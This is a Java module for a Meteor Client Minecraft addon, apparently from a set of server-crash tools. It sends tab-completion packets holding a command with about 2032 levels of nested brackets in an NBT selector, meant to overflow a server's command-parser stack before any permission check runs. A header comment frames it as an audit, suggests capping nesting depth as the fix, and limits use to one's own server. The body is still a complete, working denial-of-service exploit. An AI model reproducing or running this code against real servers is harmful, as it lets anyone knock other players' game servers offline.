package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;


/**
 * AUDIT: Completion Crash (command-parser stack overflow via tab-complete)
 *
 * Sends a RequestCommandCompletionsC2SPacket whose command argument carries
 * a deeply-nested JSON array ({a:[[[...]]]} × 2032 levels) inside an NBT
 * selector. The command parser must recurse into the structure to evaluate
 * the completion candidates; without a depth cap it will overflow the JVM
 * stack or exhaust CPU before the permission check even runs.
 *
 * This is a one-shot module — it sends one packet then self-disables.
 *
 * Patch signal: cap SNBT/JSON nesting depth and total argument length during
 * tab-completion parsing, before any selector or command evaluation; apply
 * the same depth limits in CompletionCrash as in SNBT-depth (the two paths
 * can diverge in some server implementations).
 *
 * Run against your OWN local server only.
 */
public class CompletionCrash extends Module {
    private final SettingGroup sgGeneral = settings.createGroup("Rate");

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("packets-per-tick").description("Packets sent each tick.")
        .defaultValue(3).min(1).sliderMax(12).build()
    );

    public CompletionCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "completion-crash",
            "Sends a deeply nested JSON structure as a tab-completion query, targeting command parser stack overflow.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null) return;
        String overflow = generateNestedJson(2032);
        String cmd = "msg @a[nbt={PAYLOAD}]".replace("{PAYLOAD}", overflow);
        for (int i = 0; i < packets.get(); i++) {
            mc.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, cmd));
        }
        toggle();
    }

    private static String generateNestedJson(int levels) {
        StringBuilder sb = new StringBuilder("{a:");
        for (int i = 0; i < levels; i++) sb.append('[');
        for (int i = 0; i < levels; i++) sb.append(']');
        sb.append('}');
        return sb.toString();
    }
}
